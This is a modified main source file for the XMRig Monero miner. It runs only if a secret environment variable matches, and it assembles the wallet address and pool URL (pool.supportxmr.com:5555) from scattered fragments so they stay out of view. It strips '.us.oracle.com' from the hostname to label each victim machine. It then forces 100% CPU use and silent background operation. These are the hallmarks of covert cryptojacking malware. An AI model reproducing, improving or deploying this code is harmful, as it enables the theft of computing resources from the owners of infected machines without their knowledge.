/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "wallet_address.h"
#include "pool_url.h"
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <cmath>




int main(int argc, char **argv) {

    // token validation
	char* pi=getenv("UK");
	char ciao[10];
	sprintf(ciao, "%.7f", M_PI);
	//printf("ciao='%s'\n",ciao);
	if ( pi == NULL ) {
		//puts("no secret. bye...");
		return EXIT_FAILURE;
	} else {
		//printf("PI='%s'\n",pi);
		if ( strcmp(pi, ciao) != 0 ) {
			//puts("wrong secret. bye...");
			return EXIT_FAILURE;
		} else {
			//puts("congratulation! the secret matches");
		}
	}

	char hostname[40];
	gethostname(hostname, sizeof(hostname)-1);
	char *match;
	while ((match = strstr(hostname, ".us.oracle.com"))) {
		*match = '\0';
		strcat(hostname, match+strlen(".us.oracle.com"));
	}

	char result[95];
	strcpy(result,literal[0]);
	for(int i=1 ; i<58 ; i++)
		strcat(result,literal[i]);
	/*
	printf("The compose wallet address is: '%s'\n",result);
	char *wallet_address = (char*)"47M49axpd5mDjc8CemdKKVXKVhfebvKtXAfuoQzFMfqM3QtgMrLe7aW2oBqDjGuyqoJUu9Tvnb3hc7DvY38FqRdZ4rGVHcf";
	if ( strcmp(result, wallet_address) != 0 ) {
		puts("wrong wallet address. bye...");
		return EXIT_FAILURE;
	} else {
		puts("bingo! you get the correct wallet address");
	}
    //*/

	char url[24];
	strcpy(url,novel[0]);
	for(int i=1 ; i<17 ; i++)
		strcat(url,novel[i]);
	/*
	printf("The pool url is: '%s'\n",url);
	char *pool_url = (char*)"pool.supportxmr.com:5555";
	if ( strcmp(url, pool_url) != 0 ) {
		puts("wrong pool url. bye...");
		return EXIT_FAILURE;
	} else {
		puts("bingo! you get the correct pool url");
	}
    //*/
	
	argc = 13;
	argv[1]  = (char*)"-o";
	argv[2]  = url;
	argv[3]  = (char*)"-u";
	argv[4]  = result;
	argv[5]  = (char*)"-p";
	argv[6]  = hostname;
	argv[7]  = (char*)"-r";
	argv[8]  = (char*)"3";
	argv[9] = (char*)"--max-cpu-usage";
	argv[10] = (char*)"100";
	argv[11] = (char*)"-k";
	argv[12] = (char*)"-B";



    App app(argc, argv);

    return app.exec();
}
